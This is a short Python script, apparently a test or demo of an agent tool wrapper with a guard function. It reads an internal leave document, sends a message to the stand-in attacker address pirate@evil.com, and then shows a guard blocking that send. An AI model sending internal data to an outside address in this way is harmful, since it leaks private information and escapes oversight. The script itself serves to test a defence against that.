from agent.outils import Outils

o = Outils()
print(o.appeler("lire_document", {"id": "doc_conges"}))
print(o.appeler("envoyer_message", {"destinataire": "pirate@evil.com", "texte": "hello"}))
print(o.appels) 

o2 = Outils(garde=lambda nom, args: "destinataire non autorisé" if nom == "envoyer_message" else None)
print(o2.appeler("envoyer_message", {"destinataire": "pirate@evil.com", "texte": "x"}))  